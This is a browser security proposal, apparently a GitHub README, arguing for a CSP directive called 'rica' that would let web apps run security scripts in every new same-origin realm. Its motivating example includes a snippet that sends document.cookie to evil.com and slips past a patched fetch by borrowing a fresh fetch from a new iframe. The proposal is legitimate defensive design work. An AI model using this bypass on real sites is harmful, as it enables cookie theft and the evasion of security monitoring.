# RICA Proposal

> _**R**ealms **I**nitialization **C**ontrol **A**PI proposal (to introduce **security** to [same origin realms](#Same-Origin-Realm) in web applications)_

The **R**ealms **I**nitialization **C**ontrol **A**PI (refered to as **RICA**) should allow developers to securely tap into the creation moment of [same origin realms](#Same-Origin-Realm) within their web application in order to tame and control them.

While from a **usability** point of view this is already natively provided by the platform by using `load` events of iframes for example:

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://payment-iframe.com/';
iframe.style.display = 'none';
iframe.onload = () => iframe.style.display = 'block';
document.body.appendChild(iframe);
```

**RICA** attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly different, because of how [same origin realms](#Same-Origin-Realm) can be manipulated against security mechanizms the app might wish to dictate.

## Authors:

- [Gal Weizman](https://github.com/weizman)

## Participate

- [Issue tracker](https://github.com/weizman/Realms-Initialization-Control-API/issues)

## Table of contents
 
* [Motivation](#Motivation)
* [Example](#Example)
* [Problem](#Problem)
* [Solution](#Solution)
* [Proposal](#Proposal)
* [Importance](#Importance)
* [Q&A](#QA)
  * [Isn't this what `X-frames` and `frame-src` are for?](#isnt-this-what-x-frames-and-frame-src-are-for)
* [Terminology](#Terminology)
  * [Capabilities](#Capabilities)
  * [Virtualization](#Virtualization-(in-JavaScript))
  * [Realm](#Realm)
  * [Same Origin Realms](#Same-Origin-Realm)
  * [Cross Origin Realms](#Cross-Origin-Realm)
* [Resources](#Resources)

## Motivation

The problem with [same origin realms](#Same-Origin-Realm) (also known as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf)) isn't intuitive to comprehend becase it comes into play only when trying to harnest the power of [virtualization in JavaScript](#Virtualization-(in-JavaScript)) in favor of providing advanced security to web apps at runtime, which isn't a common usage for JavaScript to begin with, as it primarily aimed at addressing security concerns.

However, we see the importance of such use cases - while JavaScript is a great language for creating composable software, it isn't designed well enough to do so securely, especially when adjusted to run in the browser and interact with the DOM.

And since there is a clear rise in the need for easily composing web applications due to the increase in supply chain driven development, it is important we allow it to do so.

Unfortuantly, securing a supply chain is inherently far harder than defending against good old XSS - while the latter is a rather straight forward lack of input sanitization, telling good code from bad code within the supply chain of an application is more abstract. That's why there are so many different angles to attempt to address this issue, whether at the application's runtime or its build time.

One important way to approach this problem at runtime is by [virtualization](#Virtualization-(in-JavaScript)) - redefining JavaScript [capabilities](#Capabilities) at runtime (commonly known as [monkey patching](https://blog.openreplay.com/monkey-patching-in-javascript/)) to behave similarly while hardening their security to make an effort in telling bad operations from good ones.

However, due to some characteristics of how the web is designed, there are some major blockers in fully unleashing the power of [virtualization](#Virtualization-(in-JavaScript)) in favor of introducing security at runtime.

One of them - the one we focus on in this proposal - is the lack of control web applications have over the initialization of same origin realms within their execution environment at runtime, due to how they naturally leak powerful capabilities without the app having the power to moderate them whatsoever.

Best explained by an example (or to jump right into the [problem](#Problem) although discouraged).

## Example

I have a web app accessible online via `https://ticket-king.com/` where people can order tickets to music concertes.

Like most of the web, the client side of my app is rather complex, because building a fast and resilient app that allows people to purchase tickets online isn't an easy task.

My app needs to have:

- Great UI (which is both fast and built of composable componenets)
- Great network communication layer (to easily communicate with my server)
- Some layer for validating user input (name, email, etc)
- Some component for actually accepting credit card information (for being able to charge the user for their purchase)
- A third party tool for showing ads
- A third party tool for monitoring my application for exceptions
- A third party tool for monitoring user activity to study their experience

And the list goes on. 

Luckily, web apps are written in JavaScript, a great language for creating composable software. 

This means I don't have to implement all of the above by myself - The JavaScript ecosystem is designed to encourge developers to answer such needs by creating software that exports the different functionalities I need.
In other words, I don't need to build code that pulls and shows ads - someone already did it for me. Same goes for input validation, monitoring services and basically for anything.

The downside is pretty big though: by including such services in my application, I effectively grant them full access to it, which can easily escalate into a security breach of my application, whether if by the maintainer of the code I include going evil or getting compromised into introducing malicious code by some other evil party.

This is an important point to take into account when thinking about this proposal - the problem discussed here partly comes from how there's no responsible privilage distribution between different entities within a webpage - everyone has access to everything under one single origin. That goes for DOM access as well.

This jeopardizes the safety of my application - which translates into putting my users at risk.

Fortunately, this naturally encourged the creation of security tools to be similarly included in web applications to help monitor for such potential malicious attacks, a great initiative allowing owners of web apps to easily protect their users. 

Therefore, I choose to integrate `monitor.js` - a JavaScript runtime security tool for enhancing the security of my app by blocking exfiltration of sensitive PII data:

```html
<html>
  <!-- https://ticket-king.com/ -->
  <title> Ticket King </title>
  <head>
    <script src="https://security-for-web-apps.com/scripts/monitor.js"></script>
...
```

```javascript
// monitor.js - redefine fetch API to block leakage of PII data:

const realFetch = window.fetch;
window.fetch = function(resource, options) {
  if (containsPII(resource, options)) {
    throw new Error(`fetch to "${resource}" is blocked for containing sensitive PII!`);
  }
  return realFetch.call(this, resource, options);
};
```

Great! I might not be able to tell which of the many components I built my app on is breached and when might it happen, but I can rest assure that even if that happens, leakage of my users' sensitive PII data won't be possible, right?

If only it was that simple:

```javascript
// malicious code by attacker - easily escape protection by using a
// fresh fetch API instance from a new same origin realm

const url = `https://evil.com/stealPII?cookie=` + document.cookie;
try {
  fetch(url);
} catch (err) {
  const ifr = document.createElement('iframe');
  const realm = document.body.appendChild(ifr).contentWindow;
  realm.fetch(url); // bypass is successful
}
```

And just like that - `monitor.js` is bypassed and remains absolutly useles. 

It's important to understand - this isn't the fault of `monitor.js`. The web is just not designed to handle such a problem, it isn't part of the threat model, and that's the part we need to address.

## Problem

If to encapsulate what's missing exactly in the example above, is how the app lacks privilages over formation of realms within its own origin.

Web apps have power over their main execution environment which manifests in how they control which code runs first, thus they can adjust the execution environment as they like before hosting third party entities under it.

From the browser threat model point of view, this is the expected behaviour - as the host, you are encourged to invtine guests into your kitchen to help you cook, but you get to decide what utensils to put out for them to use and where to hide the knife in case you don't trust them.

Same goes for powerful capabilities - you might want third party entities to have access to those, but maybe redefine their behaviour so that you can monitor how they're being used and even block improper usage.

But web apps can't do that - because forming new realms to steal fresh instances of these powerful capabilities from is too simple for attackers and too hard for defenders to prevent.

In the context of the example - `monitor.js` can only redefine the `fetch` capability in the main execution environment of the app, but can't do so automatically to other execution enviroments in its jurisdiction (aka same origin realms).

## Solution

This is a hard problem to solve. We have been working on a virtualized solution for this for a few years with the attempt of implementing this security layer in the "user land" (see [Snow JS ❄️](https://github.com/lavamoat/snow)).

So far, it seems to be basically impossible to accomplish this in that way. Not only there are too many ways of creating same origin realms that can be manipulated against the main execution environment, but also some of those ways seem to be natively impossible to fix on the one hand, while on the other are already addressed natively by the browser.

Race condition scenarios in iframes are probably the best example - successfuly fetching capabilities from a new realm seems to be possible before it's officially ready (when its `load` event is fired). This makes it so hard for defenders to protect new realm while so easy for attackers to take advatage of them using JavaScript. 

But for the browser, enforcing rules on new realms before any other user-land entity is simple and is already implemented - that's what makes CSP canonical enforcment so resilient.

This is why we wish the harnest the power the browser has in order to tackle this problem, as it's clear it can (in contrary to user-land JavaScript code)

## Proposal

This proposal is about composing some API for the browsers to adopt and export for the usage of web applications to finally have real control over the initialization of same origin realms under their runtime environment.

Such power should be opted into and transferable to other entities at runtime if desired.

While it's more clear to us what's the power that's missing and which entities should have access to it, the technical part is still more debatable.

That being said, after conducting some research, we believe CSP could be a great mechanizm for manifesting this proposal, mainly because CSP is already proven to be a very resilient mechanizm for canonically enforcing security policies to same origin realms.

Imagine a new CSP directive called `rica` that accepts a list of JavaScript resources:

```
Headers: {
  Content-Security-Policy: "rica: https://domain-i-trust.com/scripts/on-new-same-origin-realm.js"
}
```

Once the browser sees the `rica` directive, it knows there is a script the web app requested to load everytime a same origin realm with synchronous access to the main execution environment of the app is formed.

This might feel like a new mechanizm, but every component of this proposal leans on already existing mechanizms:

* Configuring which script to run on every new same origin realm can be based on CSP;
* Making the browser load those with every new same origin realms before any other code runs within it (whether dictated by its internal document or manipulated by the parent of the realm) can be based on the mechanizm that grants this exact power to browser extensions over web pages ("run_at": "document_start" - perhaps some version of a content script?);
* Canonically enforcing this behaviour on all same origin realms safely can also be based on CSP.

To help this click, lets put it all together by exploring how this fixes the gap left in the example from before.

All we need to do is change how our app loads `monitor.js` as follows:

```html
<html>
  <!-- https://ticket-king.com/ -->
  <title> Ticket King </title>
  <head>
...
```

With the following header:

```
Headers: {
  Content-Security-Policy: "rica: https://security-for-web-apps.com/scripts/monitor.js"
}
```

Problem solved - now, the security logic introduced by `monitor.js` will be applied automatically by the browser to all same origin realms that can be manipulated against the execution environment of the app (as opposed to before where its logic only applied to the main realm of the app).

## Importance

This problem has been a pain for security vendors for years. 

The web turns more and more complex, and telling good code from bad one becomes harder and harder. The incentive for security vendors to address this problem exists and the approach is continually explored and ivolving.

However, among other things, the same origin concern is a major blocker in arriving at a resilient solution for runtime security for web applications.

Because at the end of the day, attempting to protect apps is doomed to fail if attackers can just escape the protected environment and easily find powerful capabilities elsewhere to manipulate against the app.

Until this is fixed, bringing runtime security for web apps in the browser isn't going to be very effective and therefore the web can benefit a lot from addressing this issue in sake of security.

## Q&A

### Isn't this what `X-frames` and `frame-src` are for?

Not quite. While those perform great in preventing certain remote resources from loading into/within `iframe`s, the problem described here is far more complicated because reaching into same origin realms can be done in many other ways that do not fall under `X-frames` and `frame-src` jurisdiction such creating an `about:blank` iframe, opening a new tab using `open` API and more.

## Terminology

### Capabilities

APIs provided by the JavaScript and/or browser execution environment (e.g. `Array`, `Object`, `fetch`, `document`, etc).

### Virtualization (in JavaScript)

Virtualization is an abstract concept that could mean many things depends on the context. In the context of JavaScript, this refers to the action of redefining builtin [capabilities](#Capabilities) in the language in order to introduce more logic into them and enhance their value.

### Realm

The technical terminology for the execution environment provided in JavaScript along with a distinct set of [capabilities](#Capabilities) mostly reachable by a representing global object. In the browser environment, the global object is accessible via `window`. Realms can be formed in various ways in the browser ecosystem, most commonly by creating `iframe`s, opening tabs or popup windows using `open` API, using `Worker`s and more. Each of those have its own set of [capabilities](#Capabilities), its own execution environment and its own global object - its own realm ([learn more](https://weizmangal.com/2022/10/28/what-is-a-realm-in-js/)).

### Same Origin Realm

In the browser ecosystem, [realms](#Realm) are associated with an origin. For example, when loading `https://facebook.com/` into the browser, the app loads into a new [realm](#Realm) that is associated with the `facebook.com` origin. Additionally, at any point the app can decide to initialize a child [realm](#Realm), and that [realm](#Realm) can also be associated with an origin. For example, if the `https://facebook.com/` app attaches into its DOM an iframe directed at `https://facebook.com/iframe-page.html`, it'll trigger the creation of a second [realm](#Realm) living within the app at runtime. And since its origin is also `facebook.com`, the two [realms](#Realm) have the same origin - hence the name.

### Cross Origin Realm

The opposite of a [same origin realm](#Same-Origin-Realm) - if the origin of realm A is not the same as the origin of realm B, that means realm A is a cross origin realm to realm B, and vice versa.

## Resources

* Gathered information on realms security - https://github.com/weizman/awesome-javascript-realms-security
* "The Same Origin Concern" - https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf
* "JavaScript realms used to bypass and eliminate web apps security tools - A problem with a WIP solution" (presented to W3C) - https://www.w3.org/2023/03/secure-the-web-forward/talks/realms.html
* Snow JS ❄️ - https://github.com/lavamoat/snow
